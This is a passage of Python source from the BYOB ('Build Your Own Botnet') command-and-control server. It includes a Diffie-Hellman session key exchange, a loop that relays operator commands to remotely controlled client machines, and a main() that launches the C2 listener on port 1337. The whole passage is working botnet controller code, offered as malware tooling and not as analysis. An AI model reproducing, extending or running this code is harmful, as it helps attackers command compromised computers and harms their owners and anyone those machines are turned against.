            p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
            a  = Crypto.Util.number.bytes_to_long(os.urandom(32))
            g  = 2
            Ax = pow(g, a, p)
            self._socket.send(Crypto.Util.number.long_to_bytes(Ax))
            Bx = Crypto.Util.number.bytes_to_long(self._socket.recv(256))
            k  = pow(Bx, a, p)
            return Crypto.Hash.MD5.new(Crypto.Util.number.long_to_bytes(k)).hexdigest()
        except Exception as e:
            self._error("{} error: {}".format(self._session_key, str(e)))
            self._kill()


    def prompt(self, data):
        with self._lock:
            return raw_input(server._prompt_color + server._prompt_style + '\n' + bytes(data).rstrip())


    def status(self):
        try:
            c = time.time() - float(self._created)
            data=['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
                  '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
                  '{} minutes'.format(int((c % 3600.0) / 60.0)) if int((c % 3600.0) / 60.0) else str(),
                  '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
            return ', '.join([i for i in data if i])
        except Exception as e:
            return "{} error: {}".format(self._get_status.func_name, str(e))


    def run(self):
        while True:
            try:
                if self._active.wait():
                    task = self._server.task_recv(self._name) if not self._prompt else self._prompt
                    print(str(task))
                    if 'help' in task.get('command'):
                        self._active.clear()
                        self._server.help(task.get('result'))
                        self._active.set()

                    elif 'passive' in task.get('command'):
                        self._server._print(task.get('result'))
                        break

                    elif 'prompt' in task.get('command'):
                        self._prompt = task
                        command = self.prompt(task.get('result') % int(self._name))
                        cmd, _, action  = command.partition(' ')
                        if cmd in ('\n', ' ', ''):
                            continue
                        elif cmd in self._server.commands and cmd != 'help':
                            result = self._server.commands[cmd](action) if len(action) else self._server.commands[cmd]()
                            if result:
                                self._server.display(result)
                                self._server.database.handle_task(task)
                            continue
                        elif cmd in self._server.database.commands:
                            result = self._server.database.commands[cmd](action) if len(action) else self._server.database.commands[cmd]()
                            if result:
                                self._server.database._display(result)
                        else:
                            self._server.task_send(command, self._name)
                    else:
                        if task.get('result') and task.get('result') != 'None':
                            self._server.display(task.get('result'))
                            self._server.database.handle_task(task)
                    if self._server._abort:
                        break
                    self.prompt = None
            except Exception as e:
                self._error(str(e))
                time.sleep(1)
                break
        self._server._return()


def main():
    parser = argparse.ArgumentParser(prog='server.py', description="BYOB (Build Your Own Botnet) Command & Control Server", version='0.4.7')
    parser.add_argument('-p','--port', type=int, default=1337, action='store', help='port for the server to listen on')
    parser.add_argument('--debug', action='store_true', default=False, help='enable debugging mode')
    try:
        options = parser.parse_args()
        byob_server  = Server(port=options.port, config='config.ini', debug=options.debug)
        byob_server.start()
    except Exception as e:
        print("\n" + colorama.Fore.RED + colorama.Style.NORMAL + "[-] " + colorama.Fore.RESET + "Error: %s" % str(e) + "\n")
        parser.print_help()
        sys.exit(0)


if __name__ == '__main__':
    colorama.init(autoreset=True)
    main()
